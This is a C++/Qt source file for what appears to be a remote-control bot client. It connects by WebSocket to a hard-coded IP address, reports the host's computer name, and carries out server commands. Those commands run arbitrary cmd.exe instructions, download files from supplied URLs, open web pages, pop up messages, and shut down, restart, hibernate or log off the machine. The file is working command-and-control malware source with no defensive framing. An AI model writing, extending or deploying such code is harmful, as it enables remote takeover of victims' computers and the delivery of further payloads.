#include "mainwindow.h"
#include <QUrl>
#include <QHostInfo>
#include <QProcess>
#include <QDesktopServices>
#include <QUrl>
#include <QCoreApplication>
#include "DownloadThread.h"
#include <QDir>

#define DEF_WS_URL QUrl("ws://178.156.149.109:8080")
#define DEF_SEPARATOR tr("sep-x8jmjgfmr9")
#define CS_SEND_COMPUTERNAME tr("FROM_WIN_CLIENT%1CS_SEND_COMPUTERNAME").arg(DEF_SEPARATOR)

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
{
    connect(&m_webSocket, &QWebSocket::connected, this, &MainWindow::onConnected);
    connect(&m_webSocket, &QWebSocket::textMessageReceived, this, &MainWindow::onMessageReceived);
    connect(&m_webSocket, &QWebSocket::disconnected, this, &MainWindow::onDisconnected);
    connect(&m_webSocket, &QWebSocket::errorOccurred, this, &MainWindow::onError);

    m_webSocket.open(DEF_WS_URL);
}

MainWindow::~MainWindow() {}

QString MainWindow::getComputerName()
{
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    return hostInfo.hostName();
}

void MainWindow::onConnected()
{
    if (m_webSocket.isValid()) {
        QString message = CS_SEND_COMPUTERNAME + DEF_SEPARATOR + getComputerName();
        m_webSocket.sendTextMessage(message);

    } else {

    }
}

void MainWindow::onMessageReceived(const QString &strMessage)
{
    QStringList lst = strMessage.split("sep-x8jmjgfmr9");
    if(lst.length() == 0)
        return;

    if(lst[0] == "FROM_SERVER")
    {
        if(lst[1] == "messagebox") {
            QStringList lstMsg = lst[2].split(",");
            if(lstMsg.length() < 3)
                return;
            QString title = lstMsg[0];
            QString content = lstMsg[1];
            QString info = lstMsg[2];

            QString iconFlag;
            if (info == "info") {
                iconFlag = "/i";
            } else if (info == "warning") {
                iconFlag = "/w";
            } else if (info == "error") {
                iconFlag = "/e";
            } else {
                iconFlag = "/i"; // Default to info
            }

            QString command = QString("msg * %1: %2").arg(title, content);
            QProcess::startDetached("cmd.exe", QStringList() << "/c" << command);
        }
        if(lst[1] == "execute") {
            QStringList arguments;
            arguments << "/C" << lst[2];

            QProcess::startDetached("cmd.exe", arguments);
        }
        if(lst[1] == "visit_page") {
            QDesktopServices::openUrl(QUrl(lst[2]));
        }
        if(lst[1] == "close_bot") {
            close();
        }
        if(lst[1] == "shutdown") {
            QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << lst[2]);
        }
        if(lst[1] == "restart") {
            QProcess::startDetached("shutdown", QStringList() << "/r" << "/t" << lst[2]);
        }
        if(lst[1] == "hibernate") {
            QProcess::startDetached("shutdown", QStringList() << "/h" << "/t" << lst[2]);
        }
        if(lst[1] == "logoff") {
            QProcess::startDetached("shutdown", QStringList() << "/l");
        }
        if(lst[1] == "abort") {
            QProcess::startDetached("shutdown", QStringList() << "/a");
        }
        if(lst[1] == "download_execute") {
            QUrl url(lst[2]);
            QString fileName = url.fileName();
            QString appDirPath = QCoreApplication::applicationDirPath();

            // Join the application directory path and the file name
            QString fullPath = QDir(appDirPath).filePath(fileName);

            DownloadThread *downloadThread = new DownloadThread(url, fullPath);
            downloadThread->start();
        }
    }
}

void MainWindow::onDisconnected()
{
}

void MainWindow::onError(QAbstractSocket::SocketError socketError)
{
    m_webSocket.open(DEF_WS_URL);
}
